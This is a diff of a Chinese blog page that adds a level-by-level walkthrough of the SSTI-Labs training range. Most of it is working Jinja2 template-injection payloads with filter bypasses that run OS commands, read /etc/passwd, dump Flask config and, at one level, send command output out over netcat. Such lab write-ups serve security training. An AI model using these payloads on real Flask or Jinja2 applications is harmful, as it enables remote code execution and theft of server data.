@@ -102,12 +102,12 @@ SSTI-Labs |
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipetv6p75j20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeybxm1pj20zk0m8niv.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciszlczyj20zk0m816d.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipesng5oej20zk0m87d4.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclh0m9pdj20zk0m8hdt.jpg"></li>
         </ul>
       </div>
     </header>
@@ -152,15 +152,90 @@ SSTI-Labs |
     
 
     <h2 id="ssti-labs"><a class="markdownIt-Anchor" href="#ssti-labs">#</a> ssti-labs</h2>
-<ol>
-<li></li>
-</ol>
+<h3 id="1"><a class="markdownIt-Anchor" href="#1">#</a> 1.</h3>
 <p>payload1:(用常规方法找 shell 类)<br>
 (1) 先用脚本找包含 builtins 的类：128,129,130…<br>
 <mark>python3</mark></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python2,有file类</span><br><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>2. 过滤了</p>
-
+<p>2. 过滤了大括号<br>
+可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%..%&#125;绕过,可以执行..中的python代码</span><br><span class="line">直接&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())%&#125;</span><br><span class="line">&#123;%print(lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;whoami&quot;).read())%&#125;</span><br></pre></td></tr></table></figure>
+<p>3. 没有回显，盲注<br>
+ kali 终端:nc -lvp 100<br>
+![[Pasted image 20230418234630.png]]<br>
+ 新 payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls|nc 127.0.0.1 100&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>4. 过滤了 []</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">去搜索了一番</span><br><span class="line"></span><br><span class="line">发现存在魔术方法可以不需要方括号来实现</span><br><span class="line"></span><br><span class="line">即__getitem__</span><br><span class="line">eg.mydict[&#x27;name&#x27;]大致等同于mydict.__getitem__(&#x27;name&#x27;)</span><br><span class="line"></span><br><span class="line">索引无法使用只好选择遍历来匹配</span><br><span class="line"></span><br><span class="line">遍历&#x27;&#x27;.__class__.__base__.__subclasses__()找到需要的模块</span><br><span class="line"></span><br><span class="line">再初始化后进行相关操作</span><br><span class="line"></span><br><span class="line">python逻辑如下</span><br><span class="line"></span><br><span class="line">for i in &#x27;&#x27;.__class__.__base__.__subclasses__():</span><br><span class="line">    if i.__name__==&#x27;Popen&#x27;</span><br><span class="line">    需要执行的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>构造成 payload 就是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p><mark>用__getitem__(‘os’) 代替 [‘os’]</mark></p>
+<p>还可以用 getitem 代替 127 继续用原始式子解出:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(127).__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>5. 过滤了单引号和双引号<br>
+ (1). 用 request 传参绕过<br>
+即可以用 request.values.args 来代替字符串</p>
+<p>原 payload1:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>修改:<br>
+ 用 hackbar</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[request.values.arg1].eval(request.values.arg2)&#125;&#125;</span><br><span class="line"></span><br><span class="line">?arg1=__builtins__&amp;arg2=__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()</span><br></pre></td></tr></table></figure>
+<p>(2).set chr 绕过</p>
+<p>&lt;class ‘warnings.catch_warnings’&gt; 中的 chr</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br><span class="line"></span><br><span class="line">flag的chr:</span><br><span class="line">chr(102)%2bchr(108)%2bchr(97)%2bchr(103)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>6. 限制了下划线<br>
+ (1) request 传参绕过<br>
+ (2) attr 函数加 reques 传参<br>
+ (1)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&#123;</span><br><span class="line">&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line">&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>(2)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">post传参</span><br><span class="line"></span><br><span class="line">`code=&#123;&#123;(x|attr(request.values.arg1)|attr(request.values.arg2)|attr(request.values.arg3))(request.values.arg4).eval(request.values.arg5)&#125;&#125;`</span><br><span class="line"></span><br><span class="line">get传参</span><br><span class="line"></span><br><span class="line">`?arg1=__init__&amp;arg2=__globals__&amp;arg3=__getitem__&amp;arg4=__builtins__&amp;arg5=__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()`</span><br></pre></td></tr></table></figure>
+<p>7. 过滤了.<br>
+(1) 用 [] 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__mro__&#x27;][2][&#x27;__subclasses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>(2) 用 attr 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;|attr(&quot;__class__)=&quot;&quot;.__class__</span><br><span class="line">foo|attr(&quot;bar&quot;)=foo.bar</span><br><span class="line"></span><br><span class="line">1.&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(213)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(40)(&#x27;flag&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol start="8">
+<li></li>
+</ol>
+<p>该题限制了一堆关键词<br>
+ “class”, “arg”, “form”, “value”, “data”, “request”, “init”, “global”, “open”, “mro”, “base”, “attr”</p>
+<p>能想到的只有改编码或者拼接字符串<br>
+ (1) 拼接字符串<br>
+该题只限制的是连续的字符串，并没有限制将零碎的字符串拼接成一整个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;&#x27;ass__&#x27;][&#x27;__mr&#x27;&#x27;o__&#x27;][2][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也可以用+连接</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__mr&#x27;+&#x27;o__&#x27;][2][&#x27;__subcl&#x27;+&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>join 拼接用法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[1,2,3]|join&#125;&#125;==123 默认用空格串联,可选参数</span><br><span class="line">&#123;&#123;[1,2,3]|join(&#x27;|&#x27;)&#125;&#125;==1|2|3</span><br><span class="line">eg.</span><br><span class="line">&#123;&#123;&quot;&quot;.class&#125;&#125;</span><br><span class="line">==&#123;&#123;&quot;&quot;.[cla,ss]|join&#125;&#125;</span><br><span class="line">==&#123;&#123;&quot;&quot;[&#x27;[cla,ss]|join&#x27;]&#125;&#125;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__[cla,ss]|join]__&#x27;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__cl&#x27;&#x27;ass__&#x27;][&#x27;__mr&#x27;&#x27;o__&#x27;][2][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[40](&#x27;flag&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>(2) 编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>9. 限制 0-9<br>
+ 用循环找到能利用的类直接用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>用 lipsum 不通过数字直接利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>构造数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;%set one=dict(a=&#x27;a&#x27;)|join|count%&#125;&#123;%set two=dict(aa=&#x27;aa&#x27;)|join|count%&#125;&#123;%set three=dict(aaa=&#x27;aaa&#x27;)|join|count%&#125;&#123;% set eryisan=(two~one~three)|int %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[eryisan].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">&#123;%set one=dict(a=a)|join|count%&#125;</span><br><span class="line">&#123;%set two=dict(aa=a)|join|count%&#125;</span><br><span class="line">&#123;%set three=dict(aaa=a)|join|count%&#125;</span><br><span class="line">&#123;% set eryisan=(two~one~three)|int %&#125;</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[eryisan].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol start="10">
+<li></li>
+</ol>
+<p>该题的限制为  <code>set config = None</code> <br>
+ 而且这题的 target 不是 flag 了</p>
+<p>而是 get config, 那就是要拿到 config 内容咯</p>
+<p>搜索一番后知道了可以用 current_app 拿到 config</p>
+<p>并且需要用到 url_for 方法</p>
+<p>payload 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>11. 过滤了 <code>, &quot; + request . [和] </code> <br>
+先确定一个利用的基本 payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum|string|list&#125;&#125;</span><br><span class="line">查看_在第几个,我这里是18</span><br><span class="line">&#123;&#123;lipsum|string|list|attr(pop)(18)&#125;&#125;</span><br><span class="line">这里的pop必须是字符串才能有用</span><br><span class="line">set一个pop字符串:</span><br><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;  </span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class="line">此时成功取到_,再用下划线去构造其他的类</span><br><span class="line">&#123;% set globals=(xiahuaxian,xiahuaxian,dict=(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">再构造后面的方法</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;  </span><br><span class="line">&#123;% set os=dict(os=a)|join %&#125;  </span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;  </span><br><span class="line">&#123;% set cat=dict(cat=a)|join%&#125;  </span><br><span class="line">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;  </span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">完成语法:</span><br><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>合在一起:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class="line">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class="line">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class="line">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>12. 这一关把数字和_也过滤了<br>
+可在上一关的基础上加数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set nine=dict(aaaaaaaaa=a)|join|count %&#125;</span><br><span class="line">&#123;% set eighteen=nine+nine %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class="line">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>13. 过滤的东西更多了，但是我们上面的 payload 完美避开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop=dict(pop=a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%&#125;</span><br><span class="line">&#123;% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set space=(lipsum|string|list)|attr(pop)(9)%&#125;</span><br><span class="line">&#123;% set os=dict(os=a)|join %&#125;</span><br><span class="line">&#123;% set popen=dict(popen=a)|join%&#125;</span><br><span class="line">&#123;% set cat=dict(cat=a)|join%&#125;</span><br><span class="line">&#123;% set cmd=(cat,space,dict(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% set read=dict(read=a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
   </div>
 
    <footer>
@@ -171,7 +246,7 @@ SSTI-Labs |
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-05-02 12:25:38" itemprop="dateModified" datetime="2023-05-02T12:25:38+08:00">2023-05-02</time>
+    <time title="修改时间：2023-05-02 12:28:45" itemprop="dateModified" datetime="2023-05-02T12:28:45+08:00">2023-05-02</time>
   </span>
 </div>
 
@@ -203,7 +278,7 @@ SSTI-Labs |
     <div class="item left">
       
 
-  <a href="/2023/05/02/SSTI/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclflwv2aj20zk0m84qp.jpg" title="SSTI总结">
+  <a href="/2023/05/02/SSTI/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclwuom7cj20zk0m8dvn.jpg" title="SSTI总结">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>SSTI总结</h3>
@@ -227,7 +302,7 @@ SSTI-Labs |
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti-labs"><span class="toc-number">1.</span> <span class="toc-text"> ssti-labs</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti-labs"><span class="toc-number">1.</span> <span class="toc-text"> ssti-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.</span></a></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
       </div>
@@ -321,16 +396,7 @@ SSTI-Labs |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/05/02/SSTI/" title="SSTI总结">SSTI总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/" title="upload-labs靶场">upload-labs靶场</a></span>
+    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
   </li>
 
       
@@ -348,7 +414,34 @@ SSTI-Labs |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/26/nessctf/" title="NSSCTF精选">NSSCTF精选</a></span>
+    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/upload-labs%E9%9D%B6%E5%9C%BA/" title="upload-labs靶场">upload-labs靶场</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
   </li>
 
       
@@ -375,7 +468,7 @@ SSTI-Labs |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
+    <span><a href="/2023/05/02/ssti-labs/" title="SSTI-Labs">SSTI-Labs</a></span>
   </li>
 
       
@@ -384,25 +477,7 @@ SSTI-Labs |
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/04/24/sqli-labs/" title="Sqli-labs靶场通关">Sqli-labs靶场通关</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
+    <span><a href="/2023/04/26/nessctf/" title="NSSCTF精选">NSSCTF精选</a></span>
   </li>
 
   </ul>
